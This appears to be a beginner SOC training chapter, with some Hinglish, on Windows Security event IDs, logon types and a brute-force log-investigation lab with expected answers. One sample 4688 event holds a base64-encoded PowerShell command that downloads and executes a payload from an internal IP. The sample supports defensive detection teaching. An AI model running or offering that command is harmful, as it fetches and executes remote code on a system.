# WINDOWS SECURITY EVENT ANALYSIS

2.1 What Are Windows Event Logs?
Layer 1: Beginner Explanation
Windows keeps a diary of everything that happens on a computer. Every time a user logs in, a file is accessed, or a program runs, Windows writes an entry in this diary. These entries are called event logs.

Hinglish: Windows har activity ka record rakhta hai—jaise koi user login kare, file open kare, ya program run kare. Yeh records "event logs" kehlate hain.

Layer 2: Technical Explanation
Windows Event Logs are structured records of system, security, and application events. They are stored in the %SystemRoot%\System32\winevt\Logs directory and can be viewed using Event Viewer.

Layer 3: SOC Analyst Perspective
"As a SOC analyst, Windows Event Logs are one of my most important data sources. They tell me who logged in, when, from where, what they did, and whether anything suspicious occurred. Without these logs, I'm flying blind."

2.2 Event Viewer
Accessing Event Viewer
Press Windows + R

Type eventvwr.msc

Press Enter

Key Log Types
Log Type	Contents
Application	Events from applications and programs
Security	Security-related events (logins, access, etc.)
System	Windows system events (driver issues, etc.)
Setup	Installation events
Forwarded Events	Events collected from other systems
The Security Log
The Security log is the most important for SOC analysts. It contains:

Authentication events (logins, logouts)

Account management (user creation, deletion)

Object access (file access, registry access)

Process creation

Policy changes

2.3 Important Windows Security Event IDs
Complete Event ID Reference Table
Event ID	Name	Why It Matters
4624	An account was successfully logged on	Successful login—normal activity, but can indicate compromise
4625	An account failed to log on	Failed login—can indicate brute force or password spraying
4634	An account was logged off	Logout—helps track session duration
4648	A logon was attempted using explicit credentials	Credential use—may indicate RunAs or lateral movement
4672	Special privileges assigned to new logon	Privileged account use—monitor for administrative activity
4688	A new process has been created	Process execution—critical for detecting malware
4698	A scheduled task was created	Persistence mechanism—attackers create scheduled tasks
4720	A user account was created	Account creation—monitor for unauthorized accounts
4728	A user was added to a privileged group	Privilege escalation—monitor for admin group additions
4732	A user was added to a security-enabled local group	Group membership changes
4740	An account was locked out	Account lockout—may indicate brute force success
1102	The audit log was cleared	Log clearing—attackers clear logs to hide activity
Event ID 4624: Successful Logon
Name: An account was successfully logged on

Why It Matters:
Successful logins are normal, but attackers who have stolen credentials will also generate 4624 events. The key is distinguishing legitimate logins from malicious ones.

Important Fields:

Field	What It Tells You
Account Name	Which user account logged in
Workstation Name	Which computer the login came from
Source Network Address	IP address of the source
Logon Type	How the logon occurred (see below)
Logon ID	Unique identifier for this session
Logon Types:

Type	Name	Description
2	Interactive	Local keyboard/mouse logon
3	Network	Network share access (SMB)
4	Batch	Scheduled task
5	Service	Windows service startup
7	Unlock	Screen unlock
8	NetworkCleartext	Network logon with clear text credentials
9	NewCredentials	RunAs with different credentials
10	RemoteInteractive	Remote Desktop (RDP)
SOC Use Case:
Monitor for:

Logins from unexpected source IPs

Logins at unusual times

Logins with Logon Type 10 from unexpected locations

Logins using disabled accounts

Suspicious Example:

text
Event ID: 4688
New Process Name: C:\Users\jsmith\AppData\Local\Temp\payload.exe
Creator Process Name: C:\Windows\System32\powershell.exe
Command Line: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxAC8AcABhAHkAbABvAGEAZAAuAGUAeABlACcAKQA=
Why suspicious? PowerShell downloading and executing a payload from a suspicious IP.

PRACTICAL LAB 2: Windows Event Log Investigation
Lab Title: "Who Logged In?"
Objective
Learn to navigate Windows Event Viewer, interpret security events, and identify suspicious activity.

Scenario
You are an L1 SOC analyst at PIET [Panipat Institute of Engineering & Technology]. A user has reported that their account seems to have been accessed without their knowledge. You need to investigate Windows security logs to determine what happened.

Difficulty
Beginner

Estimated Time
30 minutes

Prerequisites
Access to a Windows machine (physical or VM)

Event Viewer access

Lab Environment
Windows 10/11 or Windows Server

Event Viewer

Simulated log data (provided below)

Step-by-Step Procedure
Step 1: Open Event Viewer

Press Windows + R

Type eventvwr.msc

Click OK

Step 2: Navigate to Security Log

In the left panel, expand Windows Logs

Click Security

Step 3: Understand the Columns

Column	Content
Level	Information, Warning, Error
Date and Time	When the event occurred
Source	Which component logged the event
Event ID	The event identifier
Task Category	Category of the event
Step 4: Filter for Specific Events

Click Filter Current Log in the right panel

In the "Event IDs" field, enter: 4624,4625,4688

Click OK

Step 5: Analyze Sample Events

Review these simulated events:

Event 1:

text
Event ID: 4624
Date: 2024-11-15
Time: 09:05:00
Account Name: jsmith
Workstation Name: WS-FINANCE-01
Source Network Address: 192.168.1.100
Logon Type: 2
Event 2:

text
Event ID: 4625
Date: 2024-11-15
Time: 09:23:00
Account Name: jsmith
Source Network Address: 203.0.113.45
Failure Reason: Unknown user name or bad password
Event 3:

text
Event ID: 4625
Date: 2024-11-15
Time: 09:24:00
Account Name: jsmith
Source Network Address: 203.0.113.45
Failure Reason: Unknown user name or bad password
(15 more similar failures from same IP)

Event 4:

text
Event ID: 4624
Date: 2024-11-15
Time: 09:28:15
Account Name: jsmith
Workstation Name: WS-FINANCE-01
Source Network Address: 192.168.1.100
Logon Type: 10
Investigation Questions
What is the normal login pattern for jsmith?

Expected answer: Logins from internal IP (192.168.1.100) during business hours with Logon Type 2

What is suspicious about the failed login attempts?

Expected answer: 15+ failures from external IP (203.0.113.45) targeting jsmith

What happened at 09:28:15?

Expected answer: A successful login from internal IP with Logon Type 10 (RDP)

Is this suspicious? Why?

Expected answer: Yes—after multiple failures from external IP, there is a successful login from internal IP. This could indicate:

The attacker successfully guessed the password from a different IP

The attacker compromised the internal network

The legitimate user logged in from their machine (need more investigation)

Expected Findings
Failed login attempts from external IP targeting jsmith

Successful login from internal IP with RDP logon type

Need to verify if the successful login was the legitimate user

Conclusion
This investigation reveals a pattern consistent with a brute-force attack followed by a successful login. The case requires escalation to L2 to determine if the successful login was the legitimate user or an attacker.

How to Perform the Same Investigation in a SIEM
In a SIEM (like Wazuh), you would:

Search for event_id: 4624 OR event_id: 4625

Filter by user: jsmith

Sort by timestamp

Look for the pattern of failures followed by success

Check source IP addresses for anomalies

Key Concepts
Event Viewer is the primary tool for Windows log analysis

Event ID 4624 = successful login

Event ID 4625 = failed login

Logon Type indicates how the login occurred

Patterns (failures followed by success) are critical for detection

Common Mistakes
Ignoring logon type – A login from an external IP with Logon Type 10 is very different from Logon Type 2

Not correlating events – Single events mean little; patterns tell the story

Forgetting time zones – Always normalize timestamps to UTC

